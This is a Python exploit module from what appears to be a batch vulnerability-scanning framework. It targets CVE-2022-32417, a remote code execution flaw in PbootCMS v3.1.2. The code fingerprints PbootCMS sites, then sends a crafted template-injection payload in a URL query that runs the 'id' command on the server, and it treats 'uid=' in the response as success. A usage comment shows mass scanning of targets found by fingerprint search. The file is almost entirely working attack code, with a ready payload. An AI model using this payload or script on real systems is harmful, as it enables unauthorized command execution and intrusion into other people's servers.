# coding=utf-8
# @Author   : zpchcbd HG team
# @blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-11-19 15:25

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *


# python3 batch.py -m exploit.scripts.Pboot.CVE-2022-32417 -cs -fs "body=\"http://www.pbootcms.com\""

class Script(BaseScript):
    name = 'Pboot'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = 'CVE-2022-32417'
        # 来源
        self.bug_refer = 'https://cvepush.com/2022/07/25/%e5%b0%8f%e9%b1%bc%e6%98%93%e8%bf%9e%e4%bc%9a%e8%ae%ae%e7%b3%bb%e7%bb%9frce-2/'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;id']
        # 相关信息
        self.info = 'pboot cms rce, about version == v3.1.2 '

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detectPath in self.detect_path_list:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if text is not None and 'PbootCMS' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if text is not None and response.headers.get('X-Powered-By', '') and 'PbootCMS' in response.headers.get('X-Powered-By', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'uid=' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass